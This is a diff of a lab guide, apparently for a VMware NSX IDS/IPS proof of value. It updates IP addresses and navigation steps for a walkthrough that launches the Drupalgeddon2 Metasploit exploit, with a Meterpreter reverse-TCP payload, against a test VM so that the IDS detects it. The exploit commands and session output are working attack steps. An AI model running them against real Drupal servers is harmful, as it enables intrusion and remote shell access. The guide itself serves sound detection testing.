@@ -391,9 +391,11 @@ In this exercise, we will use **Metasploit** to launch a simple exploit against 
 
 **Confirm IP addressess of deployed VMs**
 1.	In the NSX Manager UI, navigate to Inventory -->  Virtual Machines
+2. Click **View Details**
 2. Note the IP addresses for the 4 VMs that were deployed
 
 ![](Images/IDPS_POC_11.PNG)
+![](Images/IDPS_POC_12.PNG)
 
 **Initiate DrupalGeddon2 attack against App1-WEB-TIER VM**
 1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
@@ -409,7 +411,7 @@ In this exercise, we will use **Metasploit** to launch a simple exploit against 
 4. Type **./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
 5.  **Alternatively**, to run the attack manually, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
-    * Type **set RHOST 192.168.10.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
+    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
     * Type **exploit** to initiate the exploit attempt
     
@@ -439,7 +441,7 @@ Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it wit
 resource (attack1.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
 resource (attack1.rc)> set RHOST 192.168.10.100
-RHOST => 192.168.10.100
+RHOST => 192.168.10.101
 resource (attack1.rc)> set RPORT 8080
 RPORT => 8080
 resource (attack1.rc)> exploit
@@ -467,7 +469,7 @@ meterpreter > ?
 8. When you are done exploiting, type **exit -z** to shut down **Meterpreter**
 
 **Confirm IDS/IPS Events show up in the NSX Manager UI**
-1.	In the NSX Manager UI, navigate to Security -->  Distributed IDS --> Rules
+1.	In the NSX Manager UI, navigate to Security -->  Security Overview
 2. Click **ADD POLICY**
 3.	Create an IDS Policy named **NSX PoV** .
 4. Check the checkbox for the policy you just created and click **ADD RULE**.
